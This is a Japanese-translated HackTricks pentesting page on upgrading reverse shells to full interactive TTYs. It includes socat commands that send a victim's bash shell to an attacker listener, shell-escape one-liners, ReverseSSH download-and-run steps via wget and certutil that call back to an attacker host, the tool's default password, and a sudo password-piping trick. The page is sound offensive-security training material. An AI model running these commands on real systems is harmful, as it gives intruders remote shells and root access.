# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## 完全なTTY

`SHELL` 変数に設定する shell は、_**/etc/shells**_ 内に **記載されている必要があります**。そうでない場合、`The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` と表示されます。また、次の snippets は bash でのみ動作することに注意してください。zsh を使用している場合は、`bash` を実行して shell を取得する前に bash に切り替えてください。

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> **`stty -a`**を実行すると、**行**と**列**の**数**を取得できます。

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **シェルを生成**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**インタラクティブな shell access**、**file transfers**、**port forwarding**を行う便利な方法は、静的リンクされた ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)をtargetに配置することです。<sup>[[1]](#references)</sup>

以下は、upx-compressed binariesを使用した`x86`の例です。その他のbinariesについては、[releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)を確認してください。

1. ssh port forwarding requestを受け取れるよう、ローカルで準備します:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 target（以前のバージョンについては、[project readme](https://github.com/Fahrj/reverse-ssh#features)を確認してください）:
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- ReverseSSHのポートフォワーディングリクエストが成功した場合、`reverse-ssh(.exe)`を実行しているユーザーのコンテキストで、デフォルトパスワード`letmeinbrudipls`を使用してログインできるようになります。
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) は Linux reverse shell を自動的に TTY にアップグレードし、端末サイズを処理し、すべてをログに記録するなど、さまざまな機能を提供します。また、Windows shell に readline サポートも提供します。<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## TTY なし

何らかの理由で full TTY を取得できない場合でも、**ユーザー入力を要求するプログラムと対話できます**。次の例では、ファイルを読み取るためにパスワードが `sudo` に渡されます：
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## 参考文献

- [1] [ReverseSSH - CTFなど向けのreverse shell機能を備えた静的リンクssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - いくつかの処理を自動化して作業を容易にするShell handler](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
